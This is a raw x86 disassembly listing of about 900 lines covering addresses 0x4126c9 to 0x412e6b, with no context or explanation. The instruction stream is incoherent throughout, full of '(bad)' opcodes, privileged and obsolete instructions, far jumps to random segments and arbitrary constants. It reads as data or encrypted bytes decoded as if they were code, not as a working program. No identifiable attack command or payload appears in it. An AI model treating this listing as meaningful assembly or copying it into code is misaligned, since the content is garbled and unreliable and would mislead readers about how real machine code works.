  4126c9:	or     BYTE PTR [eax],0x4
  4126cc:	(bad)  
  4126cd:	sub    cl,BYTE PTR [edi-0x5e]
  4126d0:	cmc    
  4126d1:	inc    ebp
  4126d2:	adc    al,0xf
  4126d4:	mov    edi,0xde334546
  4126d9:	outs   dx,BYTE PTR ds:[esi]
  4126da:	xchg   ebx,eax
  4126db:	xor    eax,esi
  4126dd:	mov    ch,0xe3
  4126df:	fisttp QWORD PTR [ecx+0x7a7d0a]
  4126e5:	pop    ds
  4126e6:	push   ebp
  4126e7:	adc    al,0x64
  4126e9:	aas    
  4126ea:	sub    eax,0x5a8a90c2
  4126ef:	jae    0x4126a4
  4126f1:	int    0x78
  4126f3:	imul   BYTE PTR [ecx]
  4126f5:	sbb    al,BYTE PTR [edx-0x4a65208]
  4126fb:	push   0x61
  4126fd:	fimul  DWORD PTR [edi]
  4126ff:	pop    edx
  412700:	inc    edi
  412701:	outs   dx,BYTE PTR ds:[esi]
  412702:	jmp    0xfb58:0x2189a161
  412709:	jbe    0x41277c
  41270b:	repz add bl,0x5
  41270f:	mov    dh,0xb6
  412711:	mov    DWORD PTR [ecx+edi*8+0x74d8396a],edi
  412718:	shr    BYTE PTR [esi+0x53],1
  41271b:	mov    edi,0x6e48cc17
  412720:	jge    0x4126e6
  412722:	xchg   esp,eax
  412723:	inc    edi
  412724:	jmp    0xcc543154
  412729:	shl    al,1
  41272b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41272c:	scas   eax,DWORD PTR es:[edi]
  41272d:	and    ebx,esp
  41272f:	retf   0x321b
  412732:	pop    eax
  412733:	jb     0x412746
  412735:	jb     0x41279a
  412737:	add    esi,ebx
  412739:	and    al,0x8
  41273b:	or     eax,0x7d6b18a2
  412741:	dec    edi
  412742:	sbb    edx,eax
  412744:	shl    BYTE PTR [esi],0x6
  412747:	loop   0x412794
  412749:	or     ah,dl
  41274b:	sub    ebx,esi
  41274d:	sub    eax,0x14d5517f
  412752:	dec    esi
  412753:	jle    0x4127ad
  412755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412756:	test   al,0xe0
  412758:	sub    ah,BYTE PTR [eax+ebx*1+0x2bbffbb7]
  41275f:	les    ecx,FWORD PTR [ecx-0x7e322672]
  412765:	es fsubrp st(5),st
  412768:	retf   
  412769:	cmp    eax,0xdff9ac9b
  41276e:	in     al,dx
  41276f:	xchg   cl,bh
  412771:	jg     0x4127cb
  412773:	imul   ecx,DWORD PTR [ecx],0x12fe5feb
  412779:	mov    WORD PTR [ebx+0x5c617f31],cs
  41277f:	fs sub eax,ebp
  412782:	xor    ah,BYTE PTR [edi-0x3e]
  412785:	mov    BYTE PTR [esi-0x57],al
  412788:	sti    
  412789:	push   ecx
  41278a:	and    edi,0x5aee8074
  412790:	fcomp  DWORD PTR [esi+0x40]
  412793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412794:	fidivr DWORD PTR [ecx+ebx*4+0x2f0b1f63]
  41279b:	imul   ecx,DWORD PTR [ebp+0x65b7c53e],0xffffffd4
  4127a2:	aaa    
  4127a3:	imul   DWORD PTR ds:[ecx+ebx*4-0x6d]
  4127a8:	mov    al,ds:0xca98a202
  4127ad:	push   ss
  4127ae:	outs   dx,DWORD PTR ds:[esi]
  4127af:	(bad)  
  4127b0:	fnsetpm(287 only) 
  4127b2:	push   edx
  4127b3:	cmp    eax,0x8e03255a
  4127b8:	jle    0x41277f
  4127ba:	hlt    
  4127bb:	sub    dh,BYTE PTR ds:0xec6f5ad7
  4127c1:	pop    ss
  4127c2:	outs   dx,BYTE PTR ds:[esi]
  4127c3:	cwde   
  4127c4:	sub    BYTE PTR ds:0x8688b8ec,ch
  4127ca:	bound  esi,QWORD PTR [eax+edi*1+0x6d]
  4127ce:	mov    esp,0x5ff575e
  4127d3:	jg     0x412799
  4127d5:	mul    DWORD PTR [esi-0x15]
  4127d8:	cmp    esi,DWORD PTR [edx]
  4127da:	jns    0x412794
  4127dc:	js     0x41279f
  4127de:	inc    edx
  4127df:	repnz push ebp
  4127e1:	dec    edx
  4127e2:	mov    WORD PTR [ebp+0x6ef8ce7c],?
  4127e8:	pop    edx
  4127e9:	cmp    edi,DWORD PTR [edx]
  4127eb:	push   ebp
  4127ec:	inc    esp
  4127ed:	xchg   edi,eax
  4127ee:	push   0x803756c3
  4127f3:	sti    
  4127f4:	fisttp WORD PTR [ebx]
  4127f6:	and    ecx,eax
  4127f8:	jnp    0x412876
  4127fa:	and    DWORD PTR [ecx],ecx
  4127fc:	xchg   esi,eax
  4127fd:	fild   DWORD PTR [eax+0x53869b43]
  412803:	xchg   esp,eax
  412804:	mov    esi,0x3dc2b653
  412809:	inc    BYTE PTR [ecx]
  41280b:	ins    DWORD PTR es:[edi],dx
  41280c:	(bad)  
  41280d:	fwait
  41280e:	jb     0x41283d
  412810:	daa    
  412811:	(bad)  
  412812:	(bad)  
  412813:	out    0x7b,al
  412815:	jl     0x412882
  412817:	test   DWORD PTR [ecx],ecx
  412819:	and    BYTE PTR [edi+eax*2-0x6c5b0b6c],bl
  412820:	(bad)  
  412821:	dec    esp
  412822:	int3   
  412823:	(bad)  
  412826:	call   0xfdec:0x5ed79b54
  41282d:	xor    al,0xd2
  41282f:	int    0x33
  412831:	xchg   esi,eax
  412832:	cmp    al,bh
  412834:	inc    ebp
  412835:	sbb    bh,BYTE PTR [esi+eiz*4]
  412838:	dec    ecx
  412839:	test   BYTE PTR [edx],bl
  41283b:	cmp    dl,BYTE PTR [ebp-0xb]
  41283e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41283f:	or     al,BYTE PTR [ecx-0x71]
  412842:	pop    ds
  412843:	shr    DWORD PTR [edx-0x59cc66f9],1
  412849:	cmp    BYTE PTR [eax+0x3de5ba0c],ch
  41284f:	adc    edi,DWORD PTR [ecx+0x79]
  412852:	pop    ebp
  412853:	inc    edi
  412854:	or     BYTE PTR [edx+0x5f],cl
  412857:	mov    cl,0xfc
  412859:	inc    edx
  41285a:	fldcw  WORD PTR [ebx-0x51]
  41285d:	int    0xfe
  41285f:	inc    edx
  412860:	dec    DWORD PTR [edi+ebp*1-0x18]
  412864:	ins    BYTE PTR es:[edi],dx
  412865:	rol    DWORD PTR [edi],0x94
  412868:	aam    0xae
  41286a:	mov    bl,0x1
  41286c:	mov    ebp,0x5d926e03
  412871:	push   ss
  412872:	xchg   BYTE PTR [esp+ebx*4],ch
  412875:	jp     0x41287c
  412877:	cmp    DWORD PTR [ebx-0x12095fb1],eax
  41287d:	dec    ecx
  41287e:	mov    dl,0x60
  412880:	icebp  
  412881:	push   ecx
  412882:	addr16 xchg ecx,eax
  412884:	icebp  
  412885:	ds sub ecx,DWORD PTR fs:[ebx-0x10faca34]
  41288d:	pop    eax
  41288e:	dec    edi
  41288f:	mov    ebp,0x4e2f1e20
  412894:	and    cl,ch
  412896:	(bad)  
  412897:	xlat   BYTE PTR ds:[ebx]
  412898:	adc    DWORD PTR [eax+0x29048714],esi
  41289e:	mov    ebp,0xe3fa68c9
  4128a3:	inc    ecx
  4128a4:	adc    eax,0x15a8e90a
  4128a9:	mov    al,ds:0x64a95536
  4128ae:	jns    0x412870
  4128b0:	or     BYTE PTR [ebx+0x788767f8],al
  4128b6:	aaa    
  4128b7:	inc    esi
  4128b8:	daa    
  4128b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128ba:	test   DWORD PTR [edx+ebx*4+0x67fe9980],ebp
  4128c1:	lods   eax,DWORD PTR es:[esi]
  4128c3:	stos   BYTE PTR es:[edi],al
  4128c4:	xlat   BYTE PTR ds:[ebx]
  4128c5:	jp     0x412946
  4128c7:	jnp    0x412883
  4128c9:	mov    DWORD PTR [ebp-0x4d341037],eax
  4128cf:	ins    BYTE PTR es:[edi],dx
  4128d0:	and    edx,DWORD PTR [esi+0x7f6f0c75]
  4128d6:	cli    
  4128d7:	data16 adc BYTE PTR [esi+edi*2],ah
  4128db:	add    DWORD PTR [edi],esi
  4128dd:	cmp    edx,DWORD PTR [esi]
  4128df:	push   ebx
  4128e0:	mov    ecx,0xdb75f91d
  4128e5:	arpl   WORD PTR [eax-0xaad56db],dx
  4128eb:	ja     0x4128d4
  4128ed:	imul   esp,DWORD PTR [ecx],0x1b43c971
  4128f3:	pop    edi
  4128f4:	mov    DWORD PTR ds:0xea45d1a1,0x181eaafd
  4128fe:	push   ss
  4128ff:	nop
  412900:	stos   BYTE PTR es:[edi],al
  412901:	or     eax,0xc8c6df35
  412906:	inc    eax
  412907:	add    DWORD PTR [ebx+0x19399c94],eax
  41290d:	xor    dh,BYTE PTR [edx-0x423c9992]
  412913:	call   0xa23fea5d
  412918:	push   ss
  412919:	xor    eax,DWORD PTR [edi+0x79]
  41291c:	(bad)  
  41291d:	loope  0x412901
  41291f:	fisubr DWORD PTR [ebp+edx*4-0x14]
  412923:	jbe    0x412979
  412925:	push   esp
  412926:	rol    bh,1
  412928:	adc    DWORD PTR [eax+0x1549b8e4],edx
  41292e:	sbb    al,BYTE PTR [edx]
  412930:	test   al,0x77
  412932:	or     al,0x72
  412934:	lock lods eax,DWORD PTR ds:[esi]
  412936:	je     0x412928
  412938:	(bad)  
  412939:	fst    QWORD PTR [edi-0x3d]
  41293c:	ds pushf 
  41293e:	add    BYTE PTR [edi-0x49afc4f],cl
  412944:	dec    esi
  412945:	mov    ds,WORD PTR [ebx+0x3c6e82c9]
  41294b:	(bad)  
  41294c:	push   esi
  41294d:	jno    0x4128eb
  41294f:	sub    edx,DWORD PTR [ecx+esi*8+0x7cce68cc]
  412956:	(bad)  
  412957:	jecxz  0x41290a
  412959:	push   es
  41295a:	or     DWORD PTR [ebx+0xda625a4],ebx
  412960:	push   ebx
  412961:	inc    esi
  412962:	adc    eax,0x27f09119
  412967:	push   cs
  412968:	out    dx,eax
  412969:	mov    ds:0xa9e350c3,al
  41296e:	pop    edx
  41296f:	ror    BYTE PTR [ecx+0x6e],0x43
  412973:	out    0xfb,eax
  412975:	fcomip st,st(2)
  412977:	pop    esp
  412978:	aaa    
  412979:	repz add BYTE PTR [ebp+0x794f22bc],bl
  412980:	fcomi  st,st(4)
  412982:	and    bh,BYTE PTR [ebp+0x612ab17e]
  412988:	(bad)  
  412989:	leave  
  41298a:	ret    0x38e
  41298d:	mov    bh,0x86
  41298f:	in     eax,0x39
  412991:	xchg   DWORD PTR [eax-0x40],ebp
  412994:	pop    ds
  412995:	xchg   edi,eax
  412996:	jnp    0x41296d
  412998:	inc    esp
  412999:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41299a:	xor    ch,0x94
  41299d:	pop    edi
  41299e:	into   
  41299f:	add    edx,DWORD PTR [eax+0x47]
  4129a2:	mov    WORD PTR ds:0x469ea952,cs
  4129a8:	and    bh,BYTE PTR [ebp-0x5c]
  4129ab:	pop    ss
  4129ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129ad:	mov    ch,0xb5
  4129af:	scas   eax,DWORD PTR es:[edi]
  4129b0:	dec    edi
  4129b1:	xor    al,0x77
  4129b3:	jnp    0x412997
  4129b5:	in     eax,dx
  4129b6:	adc    ah,cl
  4129b8:	xor    al,0x96
  4129ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129bb:	es cdq 
  4129bd:	(bad)  
  4129be:	sub    dl,al
  4129c0:	push   ebx
  4129c1:	pusha  
  4129c2:	test   DWORD PTR [eax-0x4f],edx
  4129c5:	clc    
  4129c6:	jbe    0x4129c2
  4129c8:	aaa    
  4129c9:	push   esp
  4129ca:	push   ss
  4129cb:	inc    esi
  4129cc:	cdq    
  4129cd:	ja     0x4129d0
  4129cf:	(bad)  
  4129d0:	lods   eax,DWORD PTR ds:[esi]
  4129d1:	pop    ds
  4129d2:	mov    bh,0xed
  4129d4:	dec    edi
  4129d5:	cmp    BYTE PTR [edi-0x4d],dl
  4129d8:	push   fs
  4129da:	jp     0x4129a7
  4129dc:	inc    ebp
  4129dd:	adc    esp,edx
  4129df:	inc    esi
  4129e0:	push   esp
  4129e1:	jbe    0x412a03
  4129e3:	shr    DWORD PTR [ecx+0x7b],1
  4129e6:	cdq    
  4129e7:	dec    esi
  4129e8:	lods   al,BYTE PTR ds:[esi]
  4129e9:	push   ebp
  4129ea:	ret    0x1c3b
  4129ed:	xchg   DWORD PTR [edi-0x5b],ecx
  4129f0:	dec    ebx
  4129f1:	rcl    DWORD PTR [esi-0x2fa0806],0x9a
  4129f8:	stc    
  4129f9:	jb     0x412a5e
  4129fb:	lahf   
  4129fc:	loope  0x4129da
  4129fe:	outs   dx,BYTE PTR ds:[esi]
  4129ff:	outs   dx,DWORD PTR ds:[esi]
  412a00:	jb     0x4129a2
  412a02:	mov    ebx,0x1ae9aa0f
  412a07:	mov    ebp,0x5d43a6fc
  412a0c:	loopne 0x412a6c
  412a0e:	adc    eax,0xbd1ed124
  412a13:	mov    dl,al
  412a15:	push   cs
  412a16:	cmp    DWORD PTR [eax],esi
  412a18:	and    BYTE PTR [esi],0x30
  412a1b:	mov    cs,WORD PTR [edx+0x443262df]
  412a21:	cmp    ch,cl
  412a23:	xor    esp,ebp
  412a25:	dec    edx
  412a26:	inc    edi
  412a27:	jnp    0x412a18
  412a29:	ja     0x412a09
  412a2b:	iret   
  412a2c:	scas   eax,DWORD PTR es:[edi]
  412a2d:	cmp    BYTE PTR [ebx-0x11c208ff],bl
  412a33:	push   edx
  412a34:	fs scas al,BYTE PTR es:[edi]
  412a36:	fs inc edx
  412a38:	dec    ecx
  412a39:	aam    0x95
  412a3b:	test   al,0x4d
  412a3d:	jg     0x412aac
  412a3f:	inc    eax
  412a40:	pusha  
  412a41:	std    
  412a42:	cmp    dh,BYTE PTR [ecx]
  412a44:	ja     0x412aa3
  412a46:	cs xchg ax,ax
  412a49:	inc    ecx
  412a4a:	stos   DWORD PTR es:[edi],eax
  412a4b:	add    bl,BYTE PTR [eax]
  412a4d:	loopne 0x412ace
  412a4f:	push   edi
  412a50:	cld    
  412a51:	lea    edi,[edx-0x5a]
  412a54:	mov    cl,0x52
  412a56:	push   edx
  412a57:	adc    edx,DWORD PTR ds:0xa8801957
  412a5d:	int    0xb4
  412a5f:	test   DWORD PTR [edi+eax*8-0x1058a791],edx
  412a66:	sbb    bl,BYTE PTR [eax]
  412a68:	mov    WORD PTR [esi],cs
  412a6a:	mov    dl,0x37
  412a6c:	fdiv   DWORD PTR [esi-0x7d6b5a6]
  412a72:	(bad)  
  412a73:	add    ch,BYTE PTR [ecx]
  412a75:	xor    DWORD PTR [ebx-0x69a061a0],0x75
  412a7c:	add    esi,DWORD PTR [edx-0x41825382]
  412a82:	mov    ds:0x1b21e646,al
  412a87:	jg     0x412ab7
  412a89:	outs   dx,DWORD PTR ds:[esi]
  412a8a:	sub    cl,0xb7
  412a8d:	gs dec esi
  412a8f:	mov    ebx,0x19b6fe2f
  412a94:	inc    esi
  412a95:	sub    edi,eax
  412a97:	mov    dl,BYTE PTR [eax-0x4aae192c]
  412a9d:	repnz mov gs,WORD PTR [ebx+0x73]
  412aa1:	xchg   esi,eax
  412aa2:	test   al,0x53
  412aa4:	out    0xa6,al
  412aa6:	js     0x412a8a
  412aa8:	icebp  
  412aa9:	push   ecx
  412aaa:	push   edi
  412aab:	(bad)  
  412aac:	in     al,dx
  412aad:	(bad)  
  412aaf:	(bad)  
  412ab1:	stc    
  412ab2:	(bad)  [esi+0x5d95989a]
  412ab8:	std    
  412ab9:	inc    esp
  412aba:	mov    edx,0x75ffc373
  412abf:	call   0x4631ad
  412ac4:	add    cl,al
  412ac6:	int    0xd6
  412ac8:	(bad)  
  412ac9:	fcmovbe st,st(5)
  412acb:	rcr    ecx,0xdb
  412ace:	mov    ds:0x47c1d96e,al
  412ad3:	pop    edi
  412ad4:	push   esp
  412ad5:	push   ds
  412ad6:	or     DWORD PTR [edi+0x78],edi
  412ad9:	push   0x7c
  412adb:	js     0x412b55
  412add:	ficom  WORD PTR [edi+0x32]
  412ae0:	mov    cl,0x24
  412ae2:	adc    dl,bh
  412ae4:	cmp    dl,BYTE PTR [ebp+0x14]
  412ae7:	mov    dl,0x69
  412ae9:	fadd   DWORD PTR ds:0xe8e2587d
  412aef:	(bad)
  412af3:	int    0x98
  412af5:	cmp    esp,0x9be9fab8
  412afb:	iret   
  412afc:	icebp  
  412afd:	mov    eax,edi
  412aff:	add    eax,0xf388d402
  412b04:	or     BYTE PTR [ebp-0x34],dl
  412b07:	(bad)  
  412b08:	iret   
  412b09:	sub    dl,BYTE PTR [ecx+0x6b11951c]
  412b0f:	and    DWORD PTR [edx+0x3ad14060],esp
  412b15:	pop    eax
  412b16:	or     al,0x50
  412b18:	sbb    cl,BYTE PTR [ebp+0x723ae3f6]
  412b1e:	lahf   
  412b1f:	loope  0x412b7e
  412b21:	push   esi
  412b22:	icebp  
  412b23:	mov    ds:0xb5bbb86b,al
  412b28:	mov    ds:0xbcecb229,eax
  412b2d:	fnstcw WORD PTR [eax+0x46]
  412b30:	stos   DWORD PTR es:[edi],eax
  412b31:	pop    edx
  412b32:	jge    0x412b35
  412b34:	shr    BYTE PTR [eax-0xeb6a4f7],cl
  412b3a:	adc    dh,BYTE PTR [ecx+0x2b525394]
  412b40:	(bad)  
  412b41:	xchg   ebp,eax
  412b42:	in     al,0x50
  412b44:	fild   DWORD PTR [edi]
  412b46:	pop    edi
  412b47:	pop    es
  412b48:	cmp    edx,0x1f
  412b4b:	sbb    al,0x86
  412b4d:	adc    eax,0x7e411589
  412b52:	icebp  
  412b53:	mov    WORD PTR [edi-0x30],cs
  412b56:	jg     0x412b57
  412b58:	or     ebp,DWORD PTR [esp+ebx*2+0x3a]
  412b5c:	mov    bl,al
  412b5e:	(bad)  
  412b5f:	imul   edx,DWORD PTR [edi+0x7b],0x19365874
  412b66:	aad    0x4d
  412b68:	xlat   BYTE PTR ds:[ebx]
  412b69:	adc    BYTE PTR [ecx-0x8],ch
  412b6c:	sbb    BYTE PTR [esp+ecx*8],ah
  412b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b71:	jmp    0x412b56
  412b73:	dec    ebp
  412b74:	xor    eax,0xf678e4f5
  412b79:	ja     0x412b9a
  412b7b:	stos   BYTE PTR es:[edi],al
  412b7c:	outs   dx,DWORD PTR ds:[esi]
  412b7d:	div    BYTE PTR [ecx*2+0x479c2c15]
  412b84:	imul   ecx,ecx,0x5f9554fc
  412b8a:	mov    cl,0xd1
  412b8c:	enter  0x7c0d,0x9
  412b90:	dec    edi
  412b91:	sbb    esi,DWORD PTR [ebp+0x29]
  412b94:	pop    esi
  412b95:	push   ss
  412b96:	fcomp  DWORD PTR [edi+0x4dbd26f]
  412b9c:	into   
  412b9d:	sar    DWORD PTR [ebx-0x3cc0ccb1],1
  412ba3:	xor    DWORD PTR [edx-0xf],ebx
  412ba6:	dec    edi
  412ba7:	add    esp,esp
  412ba9:	push   edx
  412baa:	(bad)  
  412bab:	test   eax,0x9fa6790e
  412bb0:	sub    al,0xba
  412bb2:	and    dh,BYTE PTR ds:0xdc00f94b
  412bb8:	adc    eax,0xb8dcbf98
  412bbd:	jnp    0x412bc4
  412bbf:	and    eax,0xeee9ae49
  412bc4:	and    eax,0xece83f71
  412bc9:	push   ecx
  412bca:	pop    es
  412bcb:	lock int 0x20
  412bce:	and    ebp,0x2a
  412bd1:	adc    al,0x7
  412bd3:	add    al,dh
  412bd5:	dec    ebp
  412bd6:	(bad)  
  412bd7:	jo     0x412ba7
  412bd9:	iret   
  412bda:	loop   0x412bf3
  412bdc:	dec    esi
  412bdd:	in     eax,dx
  412bde:	retf   
  412bdf:	ficom  WORD PTR [edx-0x36]
  412be2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412be3:	mov    ss,WORD PTR [ebp-0x302bef4f]
  412be9:	mov    WORD PTR [ebx-0x12cfc538],?
  412bef:	in     al,0xa3
  412bf1:	xlat   BYTE PTR ds:[ebx]
  412bf2:	sub    esp,DWORD PTR [edx+0x6a]
  412bf5:	outs   dx,DWORD PTR ds:[esi]
  412bf6:	sub    esp,DWORD PTR [esi]
  412bf8:	adc    DWORD PTR [ebx-0x69e87c65],ecx
  412bfe:	mov    WORD PTR [edi],?
  412c00:	shr    BYTE PTR [ecx-0x58bbde4a],0x69
  412c07:	xchg   esp,eax
  412c08:	(bad)  
  412c0a:	jmp    0x412bc9
  412c0c:	xchg   esi,eax
  412c0d:	jmp    0x412c73
  412c0f:	popa   
  412c10:	idiv   bh
  412c12:	jmp    0xf95e7187
  412c17:	lea    esp,[esi+0x4d373d2f]
  412c1d:	adc    al,0x3f
  412c1f:	mov    esp,0xab7e795d
  412c24:	sub    BYTE PTR [edx-0x39],0x93
  412c28:	into   
  412c29:	cmc    
  412c2a:	loop   0x412c51
  412c2c:	imul   edx,edx,0x6f
  412c2f:	and    ebp,ecx
  412c31:	outs   dx,DWORD PTR ds:[esi]
  412c32:	and    ah,dh
  412c34:	ret    
  412c35:	dec    ebp
  412c36:	or     ah,BYTE PTR [esi+ebx*4]
  412c39:	mov    bl,0x3f
  412c3b:	scas   al,BYTE PTR es:[edi]
  412c3c:	mov    edx,0xd0b22220
  412c41:	ror    DWORD PTR [edx+0x35113935],cl
  412c47:	(bad)  
  412c48:	ins    BYTE PTR es:[edi],dx
  412c49:	pop    edi
  412c4a:	hlt    
  412c4b:	cld    
  412c4c:	repnz repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c4f:	pop    ss
  412c50:	lahf   
  412c51:	in     al,dx
  412c52:	inc    edi
  412c53:	xchg   esi,eax
  412c54:	outs   dx,DWORD PTR ds:[esi]
  412c55:	cmp    al,0x8c
  412c57:	push   cs
  412c58:	mov    ebx,gs
  412c5a:	add    ah,BYTE PTR [esi+ecx*2-0x4ad0f5fa]
  412c61:	cwde   
  412c62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c63:	xchg   eax,eax
  412c65:	or     DWORD PTR ds:0x7e9cc7e0,esp
  412c6b:	ret    0x476e
  412c6e:	adc    esp,DWORD PTR [ecx+edx*8]
  412c71:	push   edi
  412c72:	mov    edx,0x611747ff
  412c77:	arpl   WORD PTR [esi-0x1fa73110],sp
  412c7d:	mov    al,ds:0x951b0aa9
  412c82:	pop    ebp
  412c83:	out    dx,eax
  412c84:	pop    edx
  412c85:	cld    
  412c86:	or     al,0xc7
  412c88:	in     al,0xb5
  412c8a:	popa   
  412c8b:	dec    edx
  412c8c:	ins    DWORD PTR es:[edi],dx
  412c8d:	xchg   esi,eax
  412c8e:	(bad)
  412c91:	sub    dl,bh
  412c93:	push   esp
  412c94:	jbe    0x412ca2
  412c96:	jg     0x412ce4
  412c98:	outs   dx,DWORD PTR ds:[esi]
  412c99:	es out dx,al
  412c9b:	arpl   WORD PTR [ebx+0x5474f906],si
  412ca1:	and    BYTE PTR [esi+0x2c3e44ef],cl
  412ca7:	repnz and ecx,edi
  412caa:	mov    al,ds:0x5082b63a
  412caf:	aas    
  412cb0:	icebp  
  412cb1:	inc    ebx
  412cb2:	aam    0xb8
  412cb4:	adc    ebx,DWORD PTR [eiz*4+0x5d1c2fc5]
  412cbb:	inc    esi
  412cbc:	mov    eax,ds:0xa6d58930
  412cc1:	pop    ss
  412cc2:	jle    0x412c6d
  412cc4:	cwde   
  412cc5:	xchg   BYTE PTR [edi+0x34],al
  412cc8:	and    ebx,DWORD PTR [eax-0x3a]
  412ccb:	mov    edx,DWORD PTR [ebx-0x54]
  412cce:	xchg   ebp,eax
  412ccf:	jl     0x412c5e
  412cd1:	outs   dx,DWORD PTR ds:[esi]
  412cd2:	adc    edx,edi
  412cd4:	mov    eax,ds:0xcbe8b624
  412cd9:	mov    esp,DWORD PTR [esi]
  412cdb:	adc    dl,BYTE PTR [ecx]
  412cdd:	lea    edx,[esi+ebx*1+0x51a8a9da]
  412ce4:	fistp  QWORD PTR [ebx]
  412ce6:	cmp    DWORD PTR [esi-0x40],ebx
  412ce9:	push   ebx
  412cea:	jp     0x412ce1
  412cec:	int3   
  412ced:	cmp    al,0x20
  412cef:	hlt    
  412cf0:	sub    esp,DWORD PTR [edi-0x6bafd891]
  412cf6:	call   0x9607e516
  412cfb:	stos   BYTE PTR es:[edi],al
  412cfc:	test   esp,esi
  412cfe:	ja     0x412cfd
  412d00:	dec    ebp
  412d01:	push   ebx
  412d02:	sbb    ah,BYTE PTR [ecx]
  412d04:	xor    BYTE PTR [eax],0x34
  412d07:	jo     0x412cc6
  412d09:	mov    ebp,DWORD PTR [esp+ebx*2]
  412d0c:	sbb    BYTE PTR [esi+eax*2-0x5e2799e7],0x49
  412d14:	mov    ecx,0x1a7d542f
  412d19:	out    0x48,al
  412d1b:	inc    ebp
  412d1c:	or     eax,0xf22ffe4e
  412d21:	jp     0x412cdc
  412d23:	sub    al,0x4c
  412d25:	xor    BYTE PTR [ebx],0x6e
  412d28:	sbb    eax,0x48ac4560
  412d2d:	add    eax,0xf9c73950
  412d32:	sub    eax,0x812483a9
  412d37:	cmp    ebx,DWORD PTR [edi]
  412d39:	sbb    bl,dh
  412d3b:	lods   eax,DWORD PTR ds:[esi]
  412d3c:	stos   BYTE PTR es:[edi],al
  412d3d:	mov    ds:0xa55f1d92,eax
  412d42:	jge    0x412ce6
  412d44:	push   ss
  412d45:	repz push eax
  412d47:	repnz xchg edi,eax
  412d49:	push   cs
  412d4a:	ret    0x9761
  412d4d:	and    eax,0xbc308c65
  412d52:	push   0xffffffdc
  412d54:	loopne 0x412dc9
  412d56:	nop
  412d57:	dec    esi
  412d58:	add    bl,BYTE PTR [edx+ebp*4]
  412d5b:	mov    dl,0x2b
  412d5d:	push   ss
  412d5e:	push   ebx
  412d5f:	es pop ebx
  412d61:	sbb    ecx,esp
  412d63:	mov    ebp,0x661f6651
  412d68:	or     BYTE PTR [edi],dh
  412d6a:	xor    DWORD PTR [esi+0x4841d26a],ebp
  412d70:	mov    ds:0x8b9bb041,eax
  412d75:	sbb    al,0x55
  412d77:	les    ecx,FWORD PTR cs:[ebp-0x1c262179]
  412d7e:	jmp    0xe6d595b6
  412d83:	mov    ebx,0xd159d32e
  412d88:	faddp  st(2),st
  412d8a:	daa    
  412d8b:	mov    edi,0x5599c54a
  412d90:	jbe    0x412d65
  412d92:	push   esp
  412d93:	mov    eax,0x7c086598
  412d98:	popa   
  412d99:	jmp    0xe18bc780
  412d9e:	and    BYTE PTR ds:0x29c1fc4f,0xff
  412da5:	syscall 
  412da7:	cmp    al,0xdb
  412da9:	rcl    DWORD PTR [eax],0xb2
  412dac:	adc    DWORD PTR [ebx-0x38259799],edx
  412db2:	out    0x18,al
  412db4:	sar    al,1
  412db6:	mov    cl,0xcc
  412db8:	cmp    ecx,esi
  412dba:	lahf   
  412dbb:	mov    DWORD PTR [edx-0x1e1cfa43],ecx
  412dc1:	in     al,dx
  412dc2:	(bad)  
  412dc3:	fbstp  TBYTE PTR [edi+0x1555c050]
  412dc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dca:	leave  
  412dcb:	dec    edx
  412dcc:	mov    al,0x48
  412dce:	mov    bh,0xae
  412dd0:	lds    edi,FWORD PTR [ecx-0x12]
  412dd3:	lock mov al,ds:0xe55adcff
  412dd9:	inc    esp
  412dda:	rcr    al,1
  412ddc:	fbstp  TBYTE PTR [bp+si]
  412ddf:	es es inc edx
  412de2:	cmp    bl,BYTE PTR [edx-0x57b752d0]
  412de8:	icebp  
  412de9:	repz inc ebx
  412deb:	int3   
  412dec:	aas    
  412ded:	push   cs
  412dee:	mov    al,ds:0x68278d5e
  412df3:	or     eax,0xef78d61b
  412df8:	xlat   BYTE PTR ds:[ebx]
  412df9:	outs   dx,DWORD PTR ds:[esi]
  412dfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dfb:	pop    es
  412dfc:	cmp    dh,cl
  412dfe:	pop    ecx
  412dff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e00:	pop    eax
  412e01:	xchg   edi,eax
  412e02:	xor    dl,BYTE PTR [edi-0x4de4747f]
  412e08:	jecxz  0x412dc6
  412e0a:	popf   
  412e0b:	int    0x12
  412e0d:	aas    
  412e0e:	daa    
  412e0f:	fimul  WORD PTR [edi+esi*8]
  412e12:	(bad)  
  412e13:	push   ecx
  412e14:	fwait
  412e15:	scas   al,BYTE PTR es:[edi]
  412e16:	or     eax,DWORD PTR [esi]
  412e18:	scas   eax,DWORD PTR es:[edi]
  412e19:	push   ecx
  412e1a:	nop
  412e1b:	adc    al,0x1f
  412e1d:	mov    bh,0x55
  412e1f:	mov    eax,ds:0x8fd1e93d
  412e24:	popa   
  412e25:	pop    ss
  412e26:	or     edi,ebp
  412e28:	aaa    
  412e29:	retf   
  412e2a:	sbb    eax,0x8038fe1d
  412e2f:	(bad)  
  412e31:	cwde   
  412e32:	cmp    al,0xf7
  412e34:	(bad)
  412e38:	and    esp,DWORD PTR [esi+edx*4+0x7ff3ce86]
  412e3f:	int    0xd6
  412e41:	addr16 xchg bp,ax
  412e44:	(bad)  
  412e45:	fcmovnu st,st(7)
  412e47:	(bad)  
  412e48:	jg     0x412e9a
  412e4a:	mov    DWORD PTR [eax-0x4c],eax
  412e4d:	sbb    DWORD PTR [eax-0x79],edx
  412e50:	jae    0x412eae
  412e52:	shl    ebp,cl
  412e54:	loope  0x412e1e
  412e56:	call   0xd663dfac
  412e5b:	mov    ebx,0xbc562850
  412e60:	std    
  412e61:	lahf   
  412e62:	out    0xaa,al
  412e64:	mov    esp,0xdd30daf5
  412e69:	js     0x412ea5
  412e6b:	sti    
